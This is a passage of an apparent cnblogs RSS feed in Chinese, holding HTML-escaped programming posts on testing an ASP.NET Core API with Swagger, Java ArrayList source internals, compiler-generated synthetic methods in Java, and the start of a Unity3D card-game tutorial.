        &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;async&lt;/span&gt; Task&amp;lt;&lt;span&gt;bool&lt;/span&gt;&amp;gt; SaveAsync(CancellationToken cancellationToken = &lt;span&gt;default&lt;/span&gt;&lt;span&gt;(CancellationToken))
        {
            &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;await&lt;/span&gt; SaveChangesAsync(cancellationToken) &amp;gt;= &lt;span&gt;0&lt;/span&gt;&lt;span&gt;;
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;差不多了, 开始&lt;/p&gt;

&lt;p&gt;在Package Manager Console分别执行 Add-Migration XXX和 Update-database命令.&lt;/p&gt;
&lt;p&gt;注意这个时候 解决方案的启动项目必须是Web项目, 如果设置了多个启动项目, 迁移命令会不太好用.&lt;/p&gt;
&lt;p&gt;然后运行一下: 选择CoreApi.Web而不是IISExpress, 这样的话端口应该是 &lt;a href=&quot;http://localhost:5001/api/values&quot; target=&quot;_blank&quot;&gt;http://localhost:5001/api/values&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171031150149824-1591551701.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt;然后进入swagger简单测试一下ClientController: &lt;a href=&quot;http://localhost:5001/swagger/&quot; target=&quot;_blank&quot;&gt;http://localhost:5001/swagger/&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171031150407340-137427366.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h2&gt;先添加数据 POST:&lt;/h2&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171031150543683-1718872411.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;先点击右侧, 然后会把数据的json模板复制到左边的框里, 然后修改值, 然后点击try It out, 结果如下:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171031150700277-2057194380.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;然后两个Get, Delete, Put您都应该会测试.&lt;/p&gt;
&lt;p&gt;这里试一下 Patch:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/986268/201710/986268-20171031151113918-511411108.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;再查询一下, 应该没有什么问题.&lt;/p&gt;
&lt;p&gt;先写到这, 明天就能差不多写完了吧.&lt;/p&gt;
</description>
<pubDate>Tue, 31 Oct 2017 07:14:00 +0000</pubDate>
<dc:creator>solenovex</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/cgzl/p/7755801.html</dc:identifier>
</item>
<item>
<title>ArrayList 源码（基于Java1.8） - 黑色的鸟</title>
<link>http://www.cnblogs.com/xiao2shiqi/p/7761622.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/xiao2shiqi/p/7761622.html</guid>
<description>&lt;p&gt;ArrayList 基于数组实现，也就是类对变量 Object[]系列操作，封装为常用的add，remove，indexOf, contains本质是通过 size 计数器对数组进行系列的操作实现&lt;/p&gt;
&lt;p&gt;add 方法和 toArray 也是借助 Arrays 工具类完成&lt;/p&gt;
&lt;p&gt;还有很有意思的地方就是add的扩容方法 ensureCapacityInternal() 就会增加50%容量，&lt;/p&gt;
&lt;p&gt;因为底层数组是不可变的，所以add实际上是通过Arrays工具再拷贝扩容后长度的数组，然后覆盖当前数组&lt;/p&gt;
&lt;p&gt;预设集合长度是最优的操作，今天看源码才明白原理，ArrayList默认构造器为内部数组定义的长度为10，当list超出指定集合的时候，ArrayList会操作自动扩容，&lt;/p&gt;
&lt;p&gt;扩容的方法是使用Arrays.copyOf方法重新构造新的数组，然后将旧数组的数据全部拷贝到新的数组里面，重新生成，再拷贝数组，消耗是巨大的，这也导致了 ArrayList 天生的缺点，插入删除元素慢&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;38&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt; ArrayList&amp;lt;E&amp;gt; &lt;span&gt;extends&lt;/span&gt; AbstractList&amp;lt;E&amp;gt; &lt;span&gt;implements&lt;/span&gt; List&amp;lt;E&amp;gt;&lt;span&gt;, RandomAccess, Cloneable, java.io.Serializable {

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;long&lt;/span&gt; serialVersionUID = 8683452581122892189L&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; DEFAULT_CAPACITY = 10&lt;span&gt;;

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Object[] EMPTY_ELEMENTDATA =&lt;span&gt; {};

    &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; Object[] DEFAULTCAPACITY_EMPTY_ELEMENTDATA =&lt;span&gt; {};

    &lt;/span&gt;&lt;span&gt;transient&lt;/span&gt; Object[] elementData; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; non-private to simplify nested class access&lt;/span&gt;

    &lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; size;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;源码中可以看到，ArrayList继承抽象类AbstractList，实现List接口，RandomAccess, Cloneable, Serializable等接口主要用于标识，并没有很大作用&lt;/p&gt;
&lt;p&gt;DEFAULT_CAPACITY = 10 是集合的默认初始化长度，我们常用new ArrayList&amp;lt;&amp;gt;()构造，其实就是创建一个长度为10的Object[]数组&lt;/p&gt;
&lt;p&gt;size 为计数器，记录当前数组的长度&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; ArrayList(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; initialCapacity) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (initialCapacity &amp;gt; 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.elementData = &lt;span&gt;new&lt;/span&gt;&lt;span&gt; Object[initialCapacity];
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt; &lt;span&gt;if&lt;/span&gt; (initialCapacity == 0&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.elementData =&lt;span&gt; EMPTY_ELEMENTDATA;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;throw&lt;/span&gt; &lt;span&gt;new&lt;/span&gt; IllegalArgumentException(&quot;Illegal Capacity: &quot;+&lt;span&gt;
                                               initialCapacity);
        }
    }

    &lt;/span&gt;&lt;span&gt;/**&lt;/span&gt;&lt;span&gt;
     * Constructs an empty list with an initial capacity of ten.
     &lt;/span&gt;&lt;span&gt;*/&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt;&lt;span&gt; ArrayList() {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.elementData =&lt;span&gt; DEFAULTCAPACITY_EMPTY_ELEMENTDATA;
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;构造器的代码中，看下最常用的两个构造器，带参数initialCapacity的构造器，直接就让变量创建对应长度的数组，如果initialCapacity == 0 就直接赋值为空数组 Object[] elementData = {};&lt;/p&gt;
&lt;p&gt;下面无参构造器，就直接初始化容量为10的空列表&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;37&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; grow(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; minCapacity) {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; overflow-conscious code&lt;/span&gt;
        &lt;span&gt;int&lt;/span&gt; oldCapacity =&lt;span&gt; elementData.length;
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; newCapacity = oldCapacity + (oldCapacity &amp;gt;&amp;gt; 1&lt;span&gt;);
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (newCapacity - minCapacity &amp;lt; 0&lt;span&gt;)
            newCapacity &lt;/span&gt;=&lt;span&gt; minCapacity;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (newCapacity - MAX_ARRAY_SIZE &amp;gt; 0&lt;span&gt;)
            newCapacity &lt;/span&gt;=&lt;span&gt; hugeCapacity(minCapacity);
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; minCapacity is usually close to size, so this is a win:&lt;/span&gt;
        elementData =&lt;span&gt; Arrays.copyOf(elementData, newCapacity);
    }&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;上面的自动扩展数组容量的方法，每次添加元素都会调用该方法，确保集合的长度足够用，上面代码中最有趣的是2行&lt;/p&gt;
&lt;p&gt;newCapacity = oldCapacity + (oldCapacity &amp;gt;&amp;gt; 1)， 既每次扩大容量为当前容量的50%，这里的扩容是固定的，和HashMap有负载因子不同&lt;/p&gt;
&lt;p&gt;然后调用 Arrays.copyOf() 将旧数组内容和新长度作为参数，创建新的Object[]数组，并且将原数组的元素，拷贝到新的数组里面&lt;/p&gt;
&lt;p&gt;因为数组长度是不可变的，所以这里的做法是，创建新的数组，再拷贝元素，这里也是ArrayList性能最低的地方&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; size() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; size;
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; isEmpty() {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; size == 0&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; contains(Object o) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; indexOf(o) &amp;gt;= 0&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt;&lt;span&gt; indexOf(Object o) {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (o == &lt;span&gt;null&lt;/span&gt;&lt;span&gt;) {
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; size; i++&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (elementData[i]==&lt;span&gt;null&lt;/span&gt;&lt;span&gt;)
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; i;
        } &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt; {
            &lt;/span&gt;&lt;span&gt;for&lt;/span&gt; (&lt;span&gt;int&lt;/span&gt; i = 0; i &amp;lt; size; i++&lt;span&gt;)
                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; (o.equals(elementData[i]))
                    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; i;
        }
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; -1&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt;&lt;span&gt; Object[] toArray() {
    &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; Arrays.copyOf(elementData, size);
}

E elementData(&lt;/span&gt;&lt;span&gt;int&lt;/span&gt;&lt;span&gt; index) {
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; (E) elementData[index];
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;常用的size，isEmpty，contains，indexOf 也只是对Object[] 进行系列的循环判断操作&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;39&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; E get(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; index) {
        rangeCheck(index);
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt;&lt;span&gt; elementData(index);
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt;&lt;span&gt; add(E e) {
        ensureCapacityInternal(size &lt;/span&gt;+ 1);  &lt;span&gt;//&lt;/span&gt;&lt;span&gt; Increments modCount!!&lt;/span&gt;
        elementData[size++] =&lt;span&gt; e;
        &lt;/span&gt;&lt;span&gt;return&lt;/span&gt; &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
}

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; E remove(&lt;span&gt;int&lt;/span&gt;&lt;span&gt; index) {
        rangeCheck(index);
        modCount&lt;/span&gt;++&lt;span&gt;;
        E oldValue &lt;/span&gt;=&lt;span&gt; elementData(index);
        &lt;/span&gt;&lt;span&gt;int&lt;/span&gt; numMoved = size - index - 1&lt;span&gt;;
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; (numMoved &amp;gt; 0&lt;span&gt;)
            System.arraycopy(elementData, index&lt;/span&gt;+1&lt;span&gt;, elementData, index, numMoved);
        elementData[&lt;/span&gt;--size] = &lt;span&gt;null&lt;/span&gt;; &lt;span&gt;//&lt;/span&gt;&lt;span&gt; clear to let GC do its work&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; oldValue;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;get方法，也是指通过下标，从Object[]数组中获取对象，然后转型 Object -&amp;gt; E&lt;/p&gt;
&lt;p&gt;add末尾添加元素方法步骤，先判断容量是否够用，然后在数组末尾elementData[size++] == e，加入新的元素，size为数组长度&lt;/p&gt;
&lt;p&gt;remove 方法，也是通过循环equals匹配，找到下标，然后通过下标删除，—size，减去计数器长度，并没有实际减少数组长度&lt;/p&gt;
&lt;p&gt;clear方法也相同，把数组的值都设为null，然后 size = 0;&lt;/p&gt;

&lt;p&gt;总结：&lt;/p&gt;
&lt;p&gt;通过以上对ArrayList关键部分源码分析，通晓ArrayList原理，我们可以得出结论：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;ArrayList 底层来自数组，通过下标随机访问元素速度非常快，但是插入和删除要频繁的移动数组元素，改变数组长度，效率比较低&lt;/li&gt;
&lt;li&gt;ArrayList 主要性能问题在于当数组元素达到容量上限，扩容的成本很大，所以能够预先知道元素，然后使用 new ArrayList(int initialCapacity) 手动设置容量是最好的&lt;/li&gt;
&lt;/ol&gt;</description>
<pubDate>Tue, 31 Oct 2017 07:08:00 +0000</pubDate>
<dc:creator>黑色的鸟</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/xiao2shiqi/p/7761622.html</dc:identifier>
</item>
<item>
<title>Java 中冷门的 synthetic 关键字原理解读 - 道德楷模周鸿祎</title>
<link>http://www.cnblogs.com/bethunebtj/p/7761596.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/bethunebtj/p/7761596.html</guid>
<description>&lt;p&gt;看JAVA的反射时，看到有个synthetic ，还有一个方法isSynthetic() 很好奇，就了解了一下：&lt;/p&gt;
&lt;h2&gt;1.定义&lt;/h2&gt;
&lt;p&gt;Any constructs introduced by a Java compiler that do not have a corresponding construct in the source code must be marked as synthetic, except for default constructors, the class initialization method, and the values and valueOf methods of the Enum class.&lt;/p&gt;
&lt;p&gt;大意为：由java编译器生成的（除了像默认构造函数这一类的）方法，或者类&lt;/p&gt;
&lt;h2&gt;2.实例&lt;/h2&gt;
&lt;p&gt;既然知道synthetic方法和synthetic类是由编译器生成的，那到底编译器会怎么生成这些东西，又在什么情况下会生成这些东西呢？&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;hljs-keyword&quot;&gt;先看一段代码：&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;import&lt;/span&gt; &lt;span&gt;static&lt;/span&gt;&lt;span&gt; java.lang.System.out;

&lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DemonstrateSyntheticMethods
{
   &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; main(&lt;span&gt;final&lt;/span&gt;&lt;span&gt; String[] arguments)
   {
      DemonstrateSyntheticMethods.NestedClass nested &lt;/span&gt;=
         &lt;span&gt;new&lt;/span&gt;&lt;span&gt; DemonstrateSyntheticMethods.NestedClass();
      out.println(&lt;/span&gt;&quot;String: &quot; +&lt;span&gt; nested.highlyConfidential);
   }

   &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;static&lt;/span&gt; &lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; NestedClass
   {
      &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; String highlyConfidential = &quot;Don't tell anyone about me&quot;&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; highlyConfidentialInt = 42&lt;span&gt;;
      &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; Calendar highlyConfidentialCalendar =&lt;span&gt; Calendar.getInstance();
      &lt;/span&gt;&lt;span&gt;private&lt;/span&gt; &lt;span&gt;boolean&lt;/span&gt; highlyConfidentialBoolean = &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
   }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;编译之后，可以看到三个文件：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/789443/201710/789443-20171031141809886-1329498577.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;其中，最下面的这个类文件很好解释，就是我们的主class，中间的文件，是我们的内部类，上面的文件，后面再讲，我们先看一下中间这个内部类&lt;/p&gt;
&lt;h3&gt;2.1 内部类的反编译结果&lt;/h3&gt;
&lt;p&gt;用javap 反编译DemonstrateSyntheticMethods$NestedClass.class，得到如下结果：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
javap DemonstrateSyntheticMethods\$NestedClass.&lt;span&gt;class&lt;/span&gt;&lt;span&gt;
Compiled from &lt;/span&gt;&quot;DemonstrateSyntheticMethods.java&quot;
&lt;span&gt;final&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; DemonstrateSyntheticMethods$NestedClass {
  DemonstrateSyntheticMethods$NestedClass(DemonstrateSyntheticMethods$&lt;/span&gt;1&lt;span&gt;);&lt;br/&gt;&lt;/span&gt;&lt;span&gt;&lt;strong&gt;&lt;span&gt;static&lt;/span&gt; java.lang.String access$100&lt;/strong&gt;&lt;/span&gt;&lt;span&gt;&lt;span&gt;&lt;strong&gt;(DemonstrateSyntheticMethods$NestedClass);&lt;/strong&gt;&lt;/span&gt;
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;先把构造函数放一边，我们来看这个标黑的方法access$100 这个是怎么回事呢？我们的源文件里找不到这个access方法啊？&lt;/p&gt;
&lt;h3&gt;2.2 synthetic方法&lt;/h3&gt;
&lt;p&gt;这个方法就是编译器生成的synthetic方法，读者不信的话，可以用method.isSynthetic() 去验证一下。&lt;/p&gt;
&lt;p&gt;为何要生成这样一个方法呢？&lt;/p&gt;
&lt;p&gt;可以看到，我们的NestedClass类中，highConfidential是一个私有属性，而我们在外部类DemonstrateSyntheticMethods中，直接引用了这个属性。作为一个内部类，NestedClass的属性被外部类引用，在语义上毫无问题，但是这却苦了编译器。&lt;/p&gt;
&lt;p&gt;为了能让一个private的变量被引用到，编译器生成了一个package scope的access方法，这个方法就是一个get方法，在外部类使用highConfidential这个属性时，实际是使用了这个access方法。&lt;/p&gt;
&lt;p&gt;在javap中可以看到直接的证据：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/789443/201710/789443-20171031143315199-2133275841.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;图中红框的位置，可以很清楚的看到main方法实际上调用了access$100这个方法。&lt;/p&gt;
&lt;p&gt;所以，结论很清楚了，编译器为了方便内部类的私有成员被外部类引用，生成了一个get方法，这可以被理解为一个trick，绕开了private成员变量的限制。&lt;/p&gt;
&lt;h3&gt;2.3 synthetic类&lt;/h3&gt;
&lt;p&gt;定义已经提到，编译器不仅仅会生成方法，也会生成synthetic类。&lt;/p&gt;
&lt;p&gt;我们回过头来看2.1提到的最后一个类DemonstrateSyntheticMethods$1.class&lt;/p&gt;
&lt;p&gt;这个类是一个完全的空类，反编译后是这个样子：&lt;/p&gt;
&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;32&quot;&gt;
&lt;pre class=&quot;brush:java;gutter:true;&quot;&gt;
// $FF: synthetic class
class DemonstrateSyntheticMethods$1 {
}
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;这个类只出场了一次，作为内部类NestedClass的package scope的构造函数，如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/789443/201710/789443-20171031144333949-2079438791.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;

&lt;p&gt; 那么，这个类的作用呢？笔者查了很多资料，都没有明确的说明这个类的用途，只能根据代码做推测如下：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;NestedClass作为一个private类，其默认构造函数也是private的。那么，事实上，作为外部类的DemonstrateSyntheticMethods类，没有办法new这个内部类的对象，而这和我们需要的语义相违背。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;那么，为了实现语义，编译器又用了一个trick，悄悄的生成了一个构造函数NestedClass(DemonstrateSyntheticMethods$1 obj), 这个构造函数是包可见的。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;那么，外部类则可以通过new NestedClass(null)的方式，得到内部类的对象。如果读者检查一下main方法的话，可以看到这个方法的调用如下图所示。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;这就是这个synthetic类的作用。如果我们给我们的NestedClass 增加一个public级别的默认构造函数的话，则可以看到编译器不会再生成这个synthetic类。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/789443/201710/789443-20171031145107543-1847314320.png&quot; alt=&quot;&quot;/&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;h2&gt;3.结论&lt;/h2&gt;
&lt;p&gt;编译器通过生成一些在源代码中不存在的synthetic方法和类的方式，实现了对private级别的字段和类的访问，从而绕开了语言限制，这可以算是一种trick。&lt;/p&gt;
&lt;p&gt;在实际生产和应用中，基本不存在程序员需要考虑synthetic的地方。&lt;/p&gt;
&lt;p&gt;PS: 在此&lt;strong&gt;提一个的常见的存在synthetic的案例。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;如果同时用到了Enum和switch，如先定义一个enum枚举，然后用switch遍历这个枚举，java编译器会偷偷生成一个synthetic的数组，数组内容是enum的实例。&lt;/p&gt;
&lt;p&gt;对于这种情况，笔者找到了一个资料，可供参考：&lt;/p&gt;
&lt;p class=&quot;article-title&quot;&gt;&lt;a href=&quot;http://www.hankcs.com/program/java/enum-java-examples-of-dynamic-modification.html&quot;&gt;Java动态修改Enum实例&lt;/a&gt;&lt;/p&gt;
&lt;hr/&gt;&lt;p class=&quot;article-title&quot;&gt; &lt;/p&gt;
&lt;p class=&quot;article-title&quot;&gt;完。&lt;/p&gt;
</description>
<pubDate>Tue, 31 Oct 2017 07:04:00 +0000</pubDate>
<dc:creator>道德楷模周鸿祎</dc:creator>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.cnblogs.com/bethunebtj/p/7761596.html</dc:identifier>
</item>
<item>
<title>Unity3D手机斗地主游戏开发实战（01）_发牌功能实现(不定期更新中~~~) - Lancel0t</title>
<link>http://www.cnblogs.com/lizzie-xhu/p/7761586.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/lizzie-xhu/p/7761586.html</guid>
<description>&lt;p&gt;园子荒废多年，闲来无事，用Unity3D来尝试做一个简单的小游戏，一方面是对最近研究的Unity3D有点总结，一方面跟广大的园友相互学习和提高。话不多说，进入正题~&lt;/p&gt;
&lt;h3&gt;一、创建项目&lt;/h3&gt;
&lt;p&gt;1.创建Unity2017的2D项目，暂且叫做ChinesePoker吧，就用自带的UGUI来编辑UI， 目前只导入iTween插件，用来方便控制动画效果。&lt;/p&gt;
&lt;p&gt;目录结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/371995/201710/371995-20171031112256418-143063490.png&quot; alt=&quot;&quot;/&gt;  &lt;img src=&quot;http://images2017.cnblogs.com/blog/371995/201710/371995-20171031112750886-150146473.png&quot; alt=&quot;&quot; width=&quot;247&quot; height=&quot;181&quot;/&gt;&lt;/p&gt;
&lt;p&gt;考虑卡牌需要动态生成，我把图片资源放到Resource目录，并按照Card_类型（大小王，红桃，黑桃，方片，梅花 ）_数字（卡牌所在类型中的数字）命名。&lt;/p&gt;
&lt;p&gt;素材都是网上找的，没有美工基础，就是这么个意思，大家将就看吧，：）&lt;/p&gt;
&lt;p&gt;2.建第一个场景，默认叫001_Playing，作为主要玩牌的场景，暂时作为第1个场景，后期新场景添加进来，我们可能再调整场景的顺序。&lt;/p&gt;
&lt;p&gt;添加一个UI-&amp;gt;Image,选择一个背景图片；&lt;/p&gt;
&lt;p&gt;添加3个UI-&amp;gt;Canvas，分别取名叫Player0,Player1,Player2,代表玩家，对手1，对手2；&lt;/p&gt;
&lt;p&gt;每个Player底下，添加一个Image，选择卡牌背面图片，分别表示发牌时各自牌堆的位置，并在桌面放置一个总牌堆的位置，默认not active；&lt;/p&gt;
&lt;p&gt;建一个卡牌的图片，命名为Card，并作为预制件，放入Player0中间一个，稍微偏移一定位置再放置一个，用来计算每张牌跟临牌相对位置，设置not active；&lt;/p&gt;
&lt;p&gt;建一个卡牌的背面图片，命名Cover，也作为预制件；&lt;/p&gt;
&lt;p&gt;添加一个测试按钮TestButton;&lt;/p&gt;
&lt;p&gt;差不多了，大概结构如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://images2017.cnblogs.com/blog/371995/201710/371995-20171031115250402-1107019040.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;h3&gt;二、创建卡牌、玩家信息&lt;/h3&gt;
&lt;p&gt;1.新建CardInfo类，主要不要继承默认的MonoBehaviour类，用来作为卡牌的实体类；&lt;/p&gt;
&lt;p&gt;实现IComparable接口，后面手牌排序会用到。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; onclick=&quot;cnblogs_code_show('25467a74-1e71-4be1-88bb-4e93355ff774')&quot; readability=&quot;33&quot;&gt;&lt;img id=&quot;code_img_closed_25467a74-1e71-4be1-88bb-4e93355ff774&quot; class=&quot;code_img_closed&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ContractedBlock.gif&quot; alt=&quot;&quot;/&gt;&lt;img id=&quot;code_img_opened_25467a74-1e71-4be1-88bb-4e93355ff774&quot; class=&quot;code_img_opened&quot; onclick=&quot;cnblogs_code_hide('25467a74-1e71-4be1-88bb-4e93355ff774',event)&quot; src=&quot;http://images.cnblogs.com/OutliningIndicators/ExpandedBlockStart.gif&quot; alt=&quot;&quot;/&gt;&lt;div id=&quot;cnblogs_code_open_25467a74-1e71-4be1-88bb-4e93355ff774&quot; class=&quot;cnblogs_code_hide&quot; readability=&quot;61&quot;&gt;
&lt;pre&gt;
&lt;span&gt;public&lt;/span&gt; &lt;span&gt;class&lt;/span&gt;&lt;span&gt; CardInfo : IComparable
{
    &lt;/span&gt;&lt;span&gt;public&lt;/span&gt; &lt;span&gt;string&lt;/span&gt; cardName; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;卡牌图片名&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; CardTypes cardType; &lt;span&gt;//&lt;/span&gt;&lt;span&gt;牌的类型&lt;/span&gt;
    &lt;span&gt;public&lt;/span&gt; &lt;span&gt;int&lt;/span&gt; cardIndex;      &lt;span&gt;//&lt;/span&gt;&lt;span&gt;牌在所在类型的索引1-13&lt;/span&gt;

    &lt;span&gt;public&lt;/span&gt; CardInfo(&lt;span&gt;string&lt;/span&gt;&lt;span&gt; cardName)
    {
        &lt;/span&gt;&lt;span&gt;this&lt;/span&gt;.cardName =&lt;span&gt; cardName;
